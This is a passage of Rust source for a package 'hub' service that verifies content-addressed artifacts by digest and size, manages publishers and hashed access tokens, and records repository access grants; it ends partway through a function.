//! Asset hub service.

use std::collections::{BTreeSet, HashMap, HashSet};
use std::fs;
use std::io::Cursor;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};

use base64::Engine as _;
use image::{DynamicImage, GenericImageView, ImageFormat, imageops::FilterType};
use rand::RngExt;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use sha2::{Digest, Sha256};

use crate::contracts::kinds::{
    DEPENDENCY_LOCK_FILE, DependencyLockContract, HubPackageArtifactRef, HubPackageContract,
    HubPackageFile, HubPackageFileSupply, HubPackageInitialDataStep, HubPackageInitialization,
    HubPackageSpec, MAX_HUB_PACKAGE_BYTES, MAX_HUB_PACKAGE_REFERENCED_FILE_BYTES,
    ProjectConfigurationContract, decode_hub_package, decode_pipeline_graph, encode_hub_package,
};
use crate::contracts::{ContractMetadata, decode_contract, decode_contract_value, encode_contract};
use crate::infra::io::durable::{atomic_write, durable_remove_file};
use crate::platform::adapters::data::DataAdapter;
use crate::platform::error::PlatformError;
use crate::platform::model::{
    CreateHubTokenRequest, CreateProjectRequest, HubAccessGrant, HubAssetGallery, HubAssetMedia,
    HubAssetPackage, HubAssetVersion, HubAuthority, HubPublisher, HubToken, PlatformHubRepository,
    PlatformServiceInstance, ProjectFileLayout, ProjectHubRepository,
    ProjectRuntimeSelectionRequest, now_ts, slug_segment,
};
use crate::platform::policy::package::{
    PackagePolicyEntry, PackageReviewOptions, PackageSafetyReview, review_package_entries,
};
use crate::platform::policy::report::PolicyRiskLevel;
use crate::platform::sekejap;
use crate::platform::services::project::derive_trigger_kind_from_source;
use crate::platform::services::tsx_outline::extract_import_sources;
use crate::platform::services::{DependencyLockService, NodeRegistryService, ProjectService};
use crate::platform::sqlite_schema;
use crate::zebfs::{LocalZebFs, normalize_object_path};

pub struct HubService {
    control_data: Arc<dyn DataAdapter>,
    hub_data: Arc<dyn DataAdapter>,
    projects: Arc<ProjectService>,
    node_registry: Arc<NodeRegistryService>,
    dependency_lock: Arc<DependencyLockService>,
    data_root: PathBuf,
    install_locks: Mutex<HashMap<PathBuf, Arc<Mutex<()>>>>,
}

pub const DEFAULT_HUB_SERVICE_INSTANCE_ID: &str = "hub-default";
pub const HUB_SERVICE_KIND: &str = "hub";
const HUB_SERVICE_SCOPE_OWNER: &str = "hub-service";
const HUB_SERVICE_SCOPE_PROJECT: &str = "hub-default";
/// One package document ceiling, shared with the contract that defines it.
const MAX_REMOTE_HUB_ARTIFACT_BYTES: u64 = MAX_HUB_PACKAGE_BYTES as u64;
const DEFAULT_PUBLISHER_MAX_PACKAGES: i64 = 20;
const DEFAULT_PUBLISHER_MAX_PACKAGE_BYTES: i64 = 10 * 1024 * 1024;
const DEFAULT_PUBLISHER_MAX_MEDIA_FILES: i64 = 8;
/// The one name a locally published cover is served as.
const HUB_COVER_MEDIA_NAME: &str = "cover.webp";
const HUB_COVER_MEDIA_TYPE: &str = "image/webp";
const DEFAULT_PUBLISHER_MAX_IMAGE_BYTES: i64 = 2 * 1024 * 1024;
const HUB_ASSET_KIND_PIPELINE_BUNDLE: &str = "pipeline_bundle";
const HUB_ASSET_KIND_TEMPLATE_BUNDLE: &str = "template_bundle";
const HUB_ASSET_KIND_FOLDER_BUNDLE: &str = "folder_bundle";
const HUB_ASSET_KIND_PROJECT_BUNDLE: &str = "project_bundle";
const HUB_ASSET_KIND_NODE_BUNDLE: &str = "node_bundle";
const HUB_ASSET_KINDS: &[&str] = &[
    HUB_ASSET_KIND_PIPELINE_BUNDLE,
    HUB_ASSET_KIND_TEMPLATE_BUNDLE,
    HUB_ASSET_KIND_FOLDER_BUNDLE,
    HUB_ASSET_KIND_PROJECT_BUNDLE,
    HUB_ASSET_KIND_NODE_BUNDLE,
];

fn default_hub_base_url() -> String {
    std::env::var("ZEBFLOW_HUB_DEFAULT_BASE_URL")
        .ok()
        .map(|v| v.trim().trim_end_matches('/').to_string())
        .filter(|v| !v.is_empty())
        .unwrap_or_else(|| "https://hub.zebflow.com/api".to_string())
}

fn preserve_or_replace_token(existing: Option<&str>, incoming: &str) -> String {
    let trimmed = incoming.trim();
    if trimmed.is_empty() {
        existing.unwrap_or_default().to_string()
    } else {
        trimmed.to_string()
    }
}

fn prune_empty_hub_dirs(start: Option<&Path>, stop: &Path) {
    let Some(mut current) = start.map(Path::to_path_buf) else {
        return;
    };
    while current.starts_with(stop) && current != stop {
        match fs::remove_dir(&current) {
            Ok(()) => {}
            Err(_) => break,
        }
        let Some(parent) = current.parent() else {
            break;
        };
        current = parent.to_path_buf();
    }
}

#[derive(Debug, Clone, Serialize)]
pub struct HubPublishSourceItem {
    pub source_type: String,
    pub source_ref: String,
    pub name: String,
    pub description: String,
    pub path: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct HubExportPreview {
    pub asset_kind: String,
    pub source_type: String,
    pub source_ref: String,
    pub name: String,
    pub description: String,
    pub entries: Vec<HubPackageFile>,
    pub warnings: Vec<String>,
    pub total_files: usize,
    pub total_bytes: usize,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct HubProjectBundlePublishOptions {
    #[serde(default)]
    pub include_sekejap_schema: bool,
    #[serde(default)]
    pub include_sqlite_schema: bool,
    #[serde(default)]
    pub include_libraries: Vec<String>,
    #[serde(default)]
    pub include_initial_data: bool,
    #[serde(default)]
    pub initial_data_paths: Vec<String>,
}

#[derive(Debug, Clone, Serialize)]
pub struct HubInstallResult {
    pub package_id: String,
    pub version: String,
    pub asset_kind: String,
    pub install_root: String,
    pub files_written: usize,
    pub pipelines_registered: Vec<String>,
}

struct PreparedHubInstallEntry {
    install_rel: String,
    destination: PathBuf,
    bytes: Vec<u8>,
    previous: Option<Vec<u8>>,
}

/// Directory every channel keeps its content-addressed artifacts in.
const HUB_ARTIFACT_DIR: &str = "artifacts";

/// Why a package supplied as a document body has nowhere to fetch from.
///
/// The review and the install it precedes name the same reason, so a refusal
/// reads the same whichever of the two the user reached first.
const LOCAL_NODE_BUNDLE_BODY_HAS_NO_CHANNEL: &str = "a bundle supplied as a document body says nothing about where its artifacts live; \
     install it from its file instead";

/// Why a channel that only moved the document cannot fetch referenced bytes.
const CHANNEL_WITHOUT_AN_ARTIFACT_LOCATION: &str =
    "this channel does not say where its artifacts live";

/// Where the channel a package arrived through keeps its referenced artifacts.
///
/// An artifact reference carries a digest and never a location, so the location
/// is the channel's to supply: `<channel-base>/artifacts/<sha256>`. A package
/// copied into a different repository still resolves, and two packages shipping
/// one runtime read the same file.
///
/// A channel that cannot answer says so. Every install through it then refuses
/// a referenced file rather than writing an empty one in its place.
#[derive(Debug, Clone)]
pub enum HubArtifactChannel {
    /// A directory holding `artifacts/<sha256>`: this instance's Hub store, or
    /// the folder a supplied document was read from.
    Local(PathBuf),
    /// This channel cannot fetch referenced bytes, and says why.
    Unresolvable(&'static str),
}

impl HubArtifactChannel {
    /// A channel whose artifacts sit beside `base`, under `artifacts/`.
    pub fn local(base: impl Into<PathBuf>) -> Self {
        Self::Local(base.into())
    }

    /// A channel with nowhere to look, refusing with `reason`.
    pub fn unresolvable(reason: &'static str) -> Self {
        Self::Unresolvable(reason)
    }

    /// Fetches one referenced artifact and verifies it against its digest.
    ///
    /// Nothing this returns has been written anywhere: callers resolve every
    /// reference first and write only once all of them pass, so a mismatch or a
    /// failed fetch leaves the previous state exactly as it was.
    fn resolve(
        &self,
        rel_path: &str,
        artifact: &HubPackageArtifactRef,
        declared_size_bytes: usize,
    ) -> Result<Vec<u8>, PlatformError> {
        let base = match self {
            Self::Local(base) => base,
            Self::Unresolvable(reason) => {
                return Err(PlatformError::new(
                    "HUB_ARTIFACT_UNRESOLVED",
                    format!(
                        "file '{rel_path}' references artifact {} and {reason}",
                        artifact.sha256
                    ),
                ));
            }
        };
        if declared_size_bytes > MAX_HUB_PACKAGE_REFERENCED_FILE_BYTES {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_TOO_LARGE",
                format!(
                    "file '{rel_path}' declares {declared_size_bytes} bytes, over the \
                     {MAX_HUB_PACKAGE_REFERENCED_FILE_BYTES} byte limit for a referenced artifact"
                ),
            ));
        }
        let path = referenced_artifact_path(base, &artifact.sha256)?;
        let metadata = match fs::symlink_metadata(&path) {
            Ok(metadata) => metadata,
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
                return Err(PlatformError::new(
                    "HUB_ARTIFACT_MISSING",
                    format!(
                        "file '{rel_path}' references artifact {}, which this channel does not have",
                        artifact.sha256
                    ),
                ));
            }
            Err(error) => return Err(error.into()),
        };
        if !metadata.is_file() {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_INVALID",
                format!("artifact {} is not a regular file", artifact.sha256),
            ));
        }
        if metadata.len() != declared_size_bytes as u64 {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_SIZE_MISMATCH",
                format!(
                    "file '{rel_path}' declares {declared_size_bytes} bytes but artifact {} is {} bytes",
                    artifact.sha256,
                    metadata.len()
                ),
            ));
        }
        let bytes = fs::read(&path)?;
        let actual = sha256_hex(&bytes);
        if actual != artifact.sha256 {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_DIGEST_MISMATCH",
                format!(
                    "file '{rel_path}' expects artifact {}, but the stored bytes hash to {actual}",
                    artifact.sha256
                ),
            ));
        }
        Ok(bytes)
    }
}

/// Where a document read from disk keeps its artifacts.
///
/// The review and the install must read the same directory, or a package could
/// review against bytes the install never fetches.
fn local_document_channel_base(document_path: &Path) -> PathBuf {
    document_path
        .parent()
        .unwrap_or(Path::new("."))
        .to_path_buf()
}

/// `<base>/artifacts/<sha256>`.
///
/// The digest is the whole file name, so it is checked before it becomes a path
/// segment: a reference is content-addressed and can never name a directory or
/// a neighbour.
fn referenced_artifact_path(base: &Path, sha256: &str) -> Result<PathBuf, PlatformError> {
    let valid = sha256.len() == 64
        && sha256
            .bytes()
            .all(|byte| byte.is_ascii_digit() || (b'a'..=b'f').contains(&byte));
    if !valid {
        return Err(PlatformError::new(
            "HUB_ARTIFACT_INVALID",
            format!("artifact digest '{sha256}' is not 64 lowercase hexadecimal digits"),
        ));
    }
    Ok(base.join(HUB_ARTIFACT_DIR).join(sha256))
}

#[derive(Debug, Clone, Serialize)]
pub struct HubInstallReview {
    pub package_id: String,
    pub version: String,
    pub target_folder: String,
    pub install_root: String,
    pub asset_kind: String,
    pub files_added: Vec<String>,
    pub files_overwritten: Vec<String>,
    pub pipelines_registered: Vec<String>,
    pub nodes_used: Vec<String>,
    pub credentials_required: Vec<String>,
    pub external_urls: Vec<String>,
    pub database_effects: Vec<String>,
    pub filesystem_effects: Vec<String>,
    pub public_endpoints: Vec<String>,
    pub schedules: Vec<String>,
    pub large_files: Vec<String>,
    pub seed_data: Vec<String>,
    pub project_initialization: serde_json::Value,
    pub warnings: Vec<String>,
    /// Findings that make this package uninstallable, whoever approves it.
    #[serde(default)]
    pub violations: Vec<String>,
    /// True when nothing blocks installation. False means the Add action must
    /// be refused rather than confirmed.
    pub installable: bool,
    pub risk_level: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct HubPublishReview {
    pub package_id: String,
    pub version: String,
    pub asset_kind: String,
    pub source_type: String,
    pub source_ref: String,
    pub title: String,
    pub description: String,
    pub visibility: String,
    pub tags: Vec<String>,
    pub total_files: usize,
    pub total_bytes: usize,
    pub files: Vec<HubPackageFile>,
    pub media: Vec<HubPublishMediaReview>,
    pub nodes_used: Vec<String>,
    pub credentials_required: Vec<String>,
    pub external_urls: Vec<String>,
    pub database_effects: Vec<String>,
    pub filesystem_effects: Vec<String>,
    pub public_endpoints: Vec<String>,
    pub schedules: Vec<String>,
    pub large_files: Vec<String>,
    pub seed_data: Vec<String>,
    pub project_initialization: serde_json::Value,
    pub warnings: Vec<String>,
    /// Findings no approval overrides, in the same tier the install review uses.
    #[serde(default)]
    pub violations: Vec<String>,
    pub risk_level: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct HubPublishMediaReview {
    pub name: String,
    pub role: String,
    pub content_type: String,
    pub size_bytes: usize,
}

#[derive(Debug, Clone, Serialize)]
pub struct HubRemotePackRow {
    pub repository_id: String,
    pub repository_title: String,
    pub package_id: String,
    #[serde(skip_serializing_if = "String::is_empty")]
    pub publisher_owner: String,
    pub publisher_id: String,
    pub publisher_display_name: String,
    pub publisher_url: String,
    #[serde(skip_serializing_if = "String::is_empty")]
    pub publisher_email: String,
    pub asset_kind: String,
    pub title: String,
    pub description: String,
    pub summary: String,
    pub image_url: String,
    pub gallery: Value,
    pub visibility: String,
    pub tags: Vec<String>,
    pub latest_version: String,
    pub updated_at: i64,
    pub source: String,
}

#[derive(Debug, Clone, Deserialize)]
struct RemoteHubListResponse {
    items: Vec<RemoteHubAssetItem>,
}

#[derive(Debug, Clone, Deserialize)]
struct RemoteHubAssetItem {
    package_id: String,
    #[serde(default)]
    publisher_owner: String,
    #[serde(default)]
    publisher_id: String,
    #[serde(default)]
    publisher_display_name: String,
    #[serde(default)]
    publisher_url: String,
    #[serde(default)]
    publisher_email: String,
    asset_kind: String,
    title: String,
    description: String,
    #[serde(default)]
    summary: String,
    #[serde(default)]
    image_url: String,
    #[serde(default)]
    gallery: Value,
    visibility: String,
    #[serde(default)]
    tags: Vec<String>,
    #[serde(default)]
    latest_version: String,
    #[serde(default)]
    updated_at: i64,
}

#[derive(Debug, Clone, Deserialize)]
struct RemoteHubArtifactResponse {
    version: RemoteHubAssetVersion,
    #[serde(default)]
    artifact_sha256: String,
    #[serde(default)]
    artifact_size_bytes: u64,
    artifact: Value,
}

#[derive(Debug, Clone, Deserialize)]
struct RemoteHubAssetVersion {
    #[serde(default)]
    artifact_sha256: String,
}

/// One outward publish: an immutable release document plus the mutable
/// presentation that is stored beside it.
///
/// Presentation rides on the request rather than inside `artifact`, because
/// `artifact` is the release: it is digest-pinned and a listing detail must not
/// be able to change it.
#[derive(Debug, Clone, serde::Serialize, Deserialize)]
pub struct RemoteHubPublishRequest {
    pub package_id: String,
    pub version: String,
    #[serde(default)]
    pub title: String,
    #[serde(default)]
    pub description: String,
    /// Listing summary. Presentation, stored beside the release.
    #[serde(default)]
    pub summary: String,
    /// Long-form markdown. Presentation, stored beside the release.
    #[serde(default)]
    pub description_md: String,
    /// Presentation images, stored as content-addressed artifacts.
    #[serde(default)]
    pub media: Vec<RemoteHubPublishMedia>,
    /// Cover and gallery entries referencing `media` by name.
    #[serde(default)]
    pub gallery: HubAssetGallery,
    #[serde(default)]
    pub visibility: String,
    #[serde(default)]
    pub tags: Vec<String>,
    /// Provenance, kept by the receiving instance and never re-published.
    pub source_owner: String,
    pub source_project: String,
    pub source_kind: String,
    pub source_ref: String,
    pub artifact: Value,
}

/// One inbound presentation image, carried base64 on the publish request.
#[derive(Debug, Clone, serde::Serialize, Deserialize)]
pub struct RemoteHubPublishMedia {
    pub name: String,
    #[serde(default)]
    pub role: String,
    pub content_type: String,
    #[serde(default)]
    pub encoding: String,
    #[serde(default)]
    pub size_bytes: usize,
    #[serde(default)]
    pub sha256: String,
    #[serde(default)]
    pub content: String,
}

impl HubService {
    pub fn new(
        control_data: Arc<dyn DataAdapter>,
        hub_data: Arc<dyn DataAdapter>,
        projects: Arc<ProjectService>,
        node_registry: Arc<NodeRegistryService>,
        dependency_lock: Arc<DependencyLockService>,
        data_root: PathBuf,
    ) -> Self {
        Self {
            control_data,
            hub_data,
            projects,
            node_registry,
            dependency_lock,
            data_root,
            install_locks: Mutex::new(HashMap::new()),
        }
    }

    pub fn get_authority(
        &self,
        owner: &str,
        project: &str,
    ) -> Result<Option<HubAuthority>, PlatformError> {
        self.hub_data
            .get_hub_authority(&slug_segment(owner), &slug_segment(project))
    }

    pub fn get_default_service_instance(
        &self,
    ) -> Result<Option<PlatformServiceInstance>, PlatformError> {
        self.control_data
            .get_platform_service_instance(DEFAULT_HUB_SERVICE_INSTANCE_ID)
    }

    pub fn ensure_default_service_instance(
        &self,
        host_office_id: &str,
        public_base_url: &str,
        enabled: bool,
    ) -> Result<PlatformServiceInstance, PlatformError> {
        let host_office_id = host_office_id.trim();
        if host_office_id.is_empty() {
            return Err(PlatformError::new(
                "HUB_SERVICE_HOST_REQUIRED",
                "hub service host office is required",
            ));
        }
        if self
            .control_data
            .get_platform_office(host_office_id)?
            .is_none()
        {
            return Err(PlatformError::new(
                "HUB_SERVICE_HOST_MISSING",
                "hub service host office was not found",
            ));
        }
        let public_base_url = public_base_url.trim().trim_end_matches('/');
        let public_base_url = if public_base_url.is_empty() {
            default_hub_base_url()
        } else {
            public_base_url.to_string()
        };
        let existing = self.get_default_service_instance()?;
        let placement_changed = existing.as_ref().is_some_and(|item| {
            item.host_office_id != host_office_id
                || item.state_office_id != host_office_id
                || item.public_base_url != public_base_url
                || item.enabled != enabled
        });
        let now = now_ts();
        let service = PlatformServiceInstance {
            service_instance_id: DEFAULT_HUB_SERVICE_INSTANCE_ID.to_string(),
            service_kind: HUB_SERVICE_KIND.to_string(),
            display_label: "Hub".to_string(),
            host_office_id: host_office_id.to_string(),
            state_office_id: host_office_id.to_string(),
            public_base_url,
            enabled,
            status: if enabled {
                "enabled".to_string()
            } else {
                "disabled".to_string()
            },
            placement_generation: existing
                .as_ref()
                .map(|item| {
                    if placement_changed {
                        item.placement_generation.saturating_add(1)
                    } else {
                        item.placement_generation.max(1)
                    }
                })
                .unwrap_or(1),
            created_at: existing.as_ref().map(|item| item.created_at).unwrap_or(now),
            updated_at: now,
        };
        self.control_data.put_platform_service_instance(&service)?;
        Ok(service)
    }

    pub fn set_authority_enabled(
        &self,
        owner: &str,
        project: &str,
        enabled: bool,
    ) -> Result<HubAuthority, PlatformError> {
        let _ = (owner, project);
        let authority = self.ensure_service_authority()?;
        let now = now_ts();
        let next = HubAuthority {
            enabled,
            updated_at: now,
            ..authority
        };
        self.hub_data.put_hub_authority(&next)?;
        Ok(next)
    }

    pub fn list_asset_packages(&self) -> Result<Vec<HubAssetPackage>, PlatformError> {
        self.require_enabled()?;
        self.hub_data.list_hub_asset_packages()
    }

    pub fn list_asset_packages_by_owner(
        &self,
        owner: &str,
    ) -> Result<Vec<HubAssetPackage>, PlatformError> {
        let owner = slug_segment(owner);
        self.require_enabled()?;
        let mut items = self.hub_data.list_hub_asset_packages()?;
        items.retain(|item| item.publisher_owner == owner);
        Ok(items)
    }

    pub fn list_asset_versions(
        &self,
        package_id: &str,
    ) -> Result<Vec<HubAssetVersion>, PlatformError> {
        self.require_enabled()?;
        self.hub_data.list_hub_asset_versions(package_id)
    }

    pub fn delete_asset_package(
        &self,
        token: &HubToken,
        package_id: &str,
    ) -> Result<usize, PlatformError> {
        self.require_enabled()?;
        let package_id = canonical_hub_package_id(&token.publisher_id, package_id)?;
        if package_id.is_empty() {
            return Err(PlatformError::new(
                "HUB_PACKAGE_INVALID",
                "package id must not be empty",
            ));
        }
        let Some(package) = self.hub_data.get_hub_asset_package(&package_id)? else {
            return Err(PlatformError::new(
                "HUB_ASSET_MISSING",
                "asset package not found",
            ));
        };
        let can_manage = token.scopes.iter().any(|scope| scope == "hub:manage");
        if !can_manage
            && (package.publisher_owner != token.owner
                || package.publisher_id != token.publisher_id)
        {
            return Err(PlatformError::new(
                "HUB_PACKAGE_FORBIDDEN",
                "token cannot delete this package",
            ));
        }
        let versions = self.hub_data.list_hub_asset_versions(&package_id)?;
        let artifact_paths = versions
            .iter()
            .filter_map(|version| {
                self.hub_artifact_path_for_delete(&version.artifact_rel_path)
                    .ok()
            })
            .collect::<Vec<_>>();
        self.hub_data.delete_hub_asset_package(&package_id)?;
        for path in artifact_paths {
            match fs::remove_file(&path) {
                Ok(()) => {}
                Err(err) if err.kind() == std::io::ErrorKind::NotFound => {}
                Err(_) => {}
            }
            prune_empty_hub_dirs(path.parent(), &self.data_root);
        }
        Ok(versions.len())
    }

    pub fn list_publishers(
        &self,
        owner: &str,
        project: &str,
    ) -> Result<Vec<HubPublisher>, PlatformError> {
        let _ = (owner, project);
        self.require_enabled()?;
        self.hub_data
            .list_hub_publishers(HUB_SERVICE_SCOPE_OWNER, HUB_SERVICE_SCOPE_PROJECT)
    }

    pub fn upsert_publisher(
        &self,
        owner: &str,
        project: &str,
        publisher_id: &str,
        display_name: &str,
        publisher_url: &str,
        email: &str,
        description: &str,
        icon_url: &str,
        website_url: &str,
        enabled: bool,
        can_read: bool,
        can_publish: bool,
        can_manage: bool,
        max_packages: i64,
        max_package_bytes: i64,
        max_media_files: i64,
        max_image_bytes: i64,
    ) -> Result<HubPublisher, PlatformError> {
        let _ = (owner, project);
        self.require_enabled()?;
        let authority = self.ensure_service_authority()?;
        let publisher_id = normalize_hub_id_segment(publisher_id, "publisher id")?;
        if publisher_id.is_empty() {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_INVALID",
                "publisher id must not be empty",
            ));
        }
        let now = now_ts();
        let existing = self.hub_data.get_hub_publisher(
            HUB_SERVICE_SCOPE_OWNER,
            HUB_SERVICE_SCOPE_PROJECT,
            &publisher_id,
        )?;
        let row = HubPublisher {
            authority_id: authority.authority_id,
            publisher_pk: existing
                .as_ref()
                .map(|v| v.publisher_pk.clone())
                .filter(|v| !v.is_empty())
                .unwrap_or_else(|| format!("mpub_{}", random_hex(8))),
            owner: HUB_SERVICE_SCOPE_OWNER.to_string(),
            project: HUB_SERVICE_SCOPE_PROJECT.to_string(),
            publisher_id: publisher_id.clone(),
            display_name: if display_name.trim().is_empty() {
                publisher_id.replace('-', " ")
            } else {
                display_name.trim().to_string()
            },
            publisher_url: normalize_publisher_url(&publisher_id, publisher_url),
            email: email.trim().to_string(),
            description: description.trim().to_string(),
            icon_url: icon_url.trim().to_string(),
            website_url: website_url.trim().to_string(),
            enabled,
            can_read,
            can_publish,
            can_manage,
            max_packages: normalize_limit(max_packages, DEFAULT_PUBLISHER_MAX_PACKAGES),
            max_package_bytes: normalize_limit(
                max_package_bytes,
                DEFAULT_PUBLISHER_MAX_PACKAGE_BYTES,
            ),
            max_media_files: normalize_limit(max_media_files, DEFAULT_PUBLISHER_MAX_MEDIA_FILES),
            max_image_bytes: normalize_limit(max_image_bytes, DEFAULT_PUBLISHER_MAX_IMAGE_BYTES),
            created_at: existing.as_ref().map(|v| v.created_at).unwrap_or(now),
            updated_at: now,
        };
        self.hub_data.put_hub_publisher(&row)?;
        Ok(row)
    }

    pub fn delete_publisher(
        &self,
        owner: &str,
        project: &str,
        publisher_id: &str,
    ) -> Result<(), PlatformError> {
        let _ = (owner, project);
        self.hub_data.delete_hub_publisher(
            HUB_SERVICE_SCOPE_OWNER,
            HUB_SERVICE_SCOPE_PROJECT,
            &slug_segment(publisher_id),
        )
    }

    pub fn create_token(
        &self,
        owner: &str,
        project: &str,
        req: &CreateHubTokenRequest,
    ) -> Result<(HubToken, String), PlatformError> {
        let owner = slug_segment(owner);
        let project = slug_segment(project);
        self.require_enabled()?;
        let authority = self.ensure_service_authority()?;
        if owner.is_empty() || project.is_empty() {
            return Err(PlatformError::new(
                "HUB_TOKEN_INVALID",
                "owner/project must not be empty",
            ));
        }
        let publisher_id = normalize_hub_id_segment(&req.publisher_id, "publisher id")?;
        let title = req.title.trim();
        if title.is_empty() || publisher_id.is_empty() {
            return Err(PlatformError::new(
                "HUB_TOKEN_INVALID",
                "token title and publisher id must not be empty",
            ));
        }
        let Some(publisher) = self.hub_data.get_hub_publisher(
            HUB_SERVICE_SCOPE_OWNER,
            HUB_SERVICE_SCOPE_PROJECT,
            &publisher_id,
        )?
        else {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_MISSING",
                "publisher not found",
            ));
        };
        if !publisher.enabled {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_DISABLED",
                "publisher is disabled",
            ));
        }
        let scopes = normalize_scopes(&req.scopes);
        validate_publisher_scopes(&publisher, &scopes)?;
        let now = now_ts();
        let token_id = format!("mkt_{}", random_hex(8));
        let secret = random_hex(24);
        let plain = format!("zfmt_{token_id}_{secret}");
        let token = HubToken {
            token_id: token_id.clone(),
            authority_id: authority.authority_id,
            publisher_pk: publisher.publisher_pk.clone(),
            owner,
            project,
            publisher_id: publisher_id.clone(),
            publisher_display_name: publisher.display_name,
            publisher_url: publisher.publisher_url,
            publisher_email: publisher.email,
            title: title.to_string(),
            secret_hash: sha256_hex(plain.as_bytes()),
            scopes,
            scope_read: false,
            scope_publish: false,
            scope_manage: false,
            expires_at: req.expires_at,
            last_used_at: None,
            revoked_at: None,
            created_at: now,
            updated_at: now,
        };
        let token = apply_scope_flags(token);
        self.hub_data.put_hub_token(&token)?;
        Ok((token, plain))
    }

    pub fn list_tokens(&self, owner: &str, project: &str) -> Result<Vec<HubToken>, PlatformError> {
        let owner = slug_segment(owner);
        let project = slug_segment(project);
        self.require_enabled()?;
        self.hub_data.list_hub_tokens(&owner, &project)
    }

    pub fn list_all_tokens(&self) -> Result<Vec<HubToken>, PlatformError> {
        self.require_enabled()?;
        self.hub_data.list_all_hub_tokens()
    }

    pub fn revoke_token(
        &self,
        owner: &str,
        project: &str,
        token_id: &str,
    ) -> Result<(), PlatformError> {
        let owner = slug_segment(owner);
        let project = slug_segment(project);
        let Some(mut token) = self.hub_data.get_hub_token(token_id)? else {
            return Ok(());
        };
        if token.owner != owner || token.project != project {
            return Err(PlatformError::new(
                "HUB_TOKEN_FORBIDDEN",
                "token does not belong to this hub",
            ));
        }
        token.revoked_at = Some(now_ts());
        token.updated_at = now_ts();
        self.hub_data.put_hub_token(&token)?;
        Ok(())
    }

    pub fn revoke_token_any(&self, token_id: &str) -> Result<(), PlatformError> {
        self.require_enabled()?;
        let Some(mut token) = self.hub_data.get_hub_token(token_id)? else {
            return Ok(());
        };
        token.revoked_at = Some(now_ts());
        token.updated_at = now_ts();
        self.hub_data.put_hub_token(&token)?;
        Ok(())
    }

    pub fn list_repositories(
        &self,
        owner: &str,
        project: &str,
    ) -> Result<Vec<ProjectHubRepository>, PlatformError> {
        self.control_data
            .list_project_hub_repositories(&slug_segment(owner), &slug_segment(project))
    }

    pub fn list_access_grants(
        &self,
        source_owner: &str,
    ) -> Result<Vec<HubAccessGrant>, PlatformError> {
        self.control_data
            .list_hub_access_grants(&slug_segment(source_owner))
    }

    pub fn upsert_access_grant(
        &self,
        source_owner: &str,
        repository_id: &str,
        grant_scope: &str,
        target_owner: &str,
        target_project: &str,
        can_read: bool,
        can_publish: bool,
        can_manage: bool,
        enabled: bool,
    ) -> Result<HubAccessGrant, PlatformError> {
        let source_owner = slug_segment(source_owner);
        let repository_id = slug_segment(repository_id);
        let grant_scope = normalize_hub_grant_scope(grant_scope)?;
        let target_owner = if grant_scope == "all_projects" {
            String::new()
        } else {
            slug_segment(target_owner)
        };
        let target_project = if grant_scope == "all_projects" {
            String::new()
        } else {
            slug_segment(target_project)
        };
        if source_owner.is_empty()
            || repository_id.is_empty()
            || (grant_scope == "selected_project"
                && (target_owner.is_empty() || target_project.is_empty()))
        {
            return Err(PlatformError::new(
                "HUB_ACCESS_GRANT_INVALID",
                "source owner, repository id, and selected project target are required",
            ));
        }
        let repos = self
            .control_data
            .list_platform_hub_repositories(&source_owner)?;
        let Some(repo) = repos
            .into_iter()
            .find(|item| item.repository_id == repository_id)
        else {
            return Err(PlatformError::new(
                "HUB_REPOSITORY_MISSING",
                "platform Hub source not found",
            ));
        };
        let now = now_ts();
        let existing = self
            .control_data
            .list_hub_access_grants(&source_owner)?
            .into_iter()
            .find(|item| {
                item.source_id == repo.source_id
                    && item.grant_scope == grant_scope
                    && item.target_owner == target_owner
                    && item.target_project == target_project
            });
        let grant = HubAccessGrant {
            grant_id: existing
                .as_ref()
                .map(|item| item.grant_id.clone())
                .filter(|value| !value.is_empty())
                .unwrap_or_else(|| format!("hgrant_{}", random_hex(8))),
            source_owner,
            source_id: repo.source_id,
            repository_id,
            grant_scope,
            target_owner,
            target_project,
            can_read,
            can_publish,
            can_manage,
            enabled,
            created_at: existing.as_ref().map(|item| item.created_at).unwrap_or(now),
            updated_at: now,
        };
        self.control_data.put_hub_access_grant(&grant)?;
        Ok(grant)
    }

    pub fn delete_access_grant(&self, grant_id: &str) -> Result<(), PlatformError> {
        self.control_data
            .delete_hub_access_grant(&slug_segment(grant_id))
    }

    pub fn list_effective_repositories(
        &self,
        owner: &str,
        project: &str,
    ) -> Result<Vec<ProjectHubRepository>, PlatformError> {
        let owner = slug_segment(owner);
        let project = slug_segment(project);
        let mut out = self
            .control_data
            .list_project_hub_repositories(&owner, &project)?;
        let mut seen = out
            .iter()
            .map(|item| item.repository_id.clone())
            .collect::<BTreeSet<_>>();
        let grants = self
            .control_data
            .list_effective_hub_access_grants(&owner, &project)?;
        for grant in grants
            .into_iter()
            .filter(|item| item.enabled && item.can_read)
        {
            if seen.contains(&grant.repository_id) {
                continue;
            }
            let source = self
                .control_data
                .list_platform_hub_repositories(&grant.source_owner)?
                .into_iter()
                .find(|item| {
                    item.source_id == grant.source_id || item.repository_id == grant.repository_id
                });
            let Some(source) = source else {
                continue;
            };
            if !source.enabled {
                continue;
            }
            seen.insert(source.repository_id.clone());
            out.push(ProjectHubRepository {
                owner: owner.clone(),
                project: project.clone(),
                repository_id: source.repository_id,
                title: source.title,
                base_url: source.base_url,
                remote_owner: source.remote_owner,
                remote_project: source.remote_project,
                read_token: source.read_token,
                enabled: source.enabled,
                created_at: grant.created_at,
                updated_at: grant.updated_at,
            });
        }
        Ok(out)
    }

    pub fn ensure_default_project_repository(
        &self,
        owner: &str,
        project: &str,
    ) -> Result<(), PlatformError> {
        let owner = slug_segment(owner);
        let project = slug_segment(project);
        if owner.is_empty() || project.is_empty() {
            return Ok(());
        }
        self.ensure_default_platform_repository(&owner)
    }

    pub fn list_platform_repositories(
        &self,
        owner: &str,
    ) -> Result<Vec<PlatformHubRepository>, PlatformError> {
        self.control_data
